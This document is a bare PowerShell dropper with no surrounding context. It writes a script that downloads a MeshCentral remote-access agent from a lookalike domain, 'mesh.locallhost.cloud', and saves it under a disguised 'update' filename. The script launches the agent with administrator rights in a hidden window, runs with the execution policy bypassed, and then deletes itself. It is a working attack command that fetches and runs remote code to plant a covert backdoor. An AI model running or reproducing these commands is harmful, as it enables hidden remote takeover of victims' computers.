echo $Url = 'https://mesh.locallhost.cloud/meshagents?id=4^&meshid=3D1$8kzevTQqn2sfWP7vb8syXUyajdzngnhpe22O2QPXZ6CxYgvzK88SqCVCxnVy^&installflags=0';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'PSupdateRemote Access64-.exe';Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = '-fullinstall';$Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command; > ok.ps1

powershell.exe -ExecutionPolicy Bypass -File ok.ps1
powershell.exe -ExecutionPolicy Bypass -Command "Remove-Item -Path 'ok.ps1' -Force"
